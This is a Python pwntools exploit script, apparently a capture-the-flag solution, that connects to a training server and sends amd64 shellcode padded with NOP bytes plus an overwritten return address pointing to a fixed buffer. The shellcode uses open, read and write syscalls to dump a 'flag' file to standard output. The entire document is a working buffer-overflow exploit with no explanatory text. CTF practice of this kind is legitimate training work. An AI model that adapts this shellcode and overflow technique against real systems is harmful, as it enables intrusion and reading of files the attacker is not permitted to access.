import pwn

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'amd64'

# r = pwn.process('./onlyreadwrite')

# pwn.gdb.attach(r, """c

# """)

input('wait')

r = pwn.remote('training.jinblack.it', 2006)

buffer_addr = 0x004040c0

asm_code = pwn.asm('''
    /* open flag */
    jmp flag_addr
    start:
    mov rax, 0x02
    pop r9
    mov rdi, r9
    mov rsi, 0x0
    mov rdx, 0x0
    syscall

    /* read flag */
    mov rdi, rax
    mov rax, 0x0
    mov rsi, r9
    mov rdx, 0x100
    syscall

    /*  write flag to std out */
    mov rdi, 0x1
    mov rsi, r9
    mov rax, 0x1
    syscall
    jmp end


    flag_addr:
    call start
    end:
''')

shell_code = asm_code + b'./flag\x00'

r.send(shell_code.ljust(1016, b'\x90') + pwn.p64(buffer_addr))

r.interactive()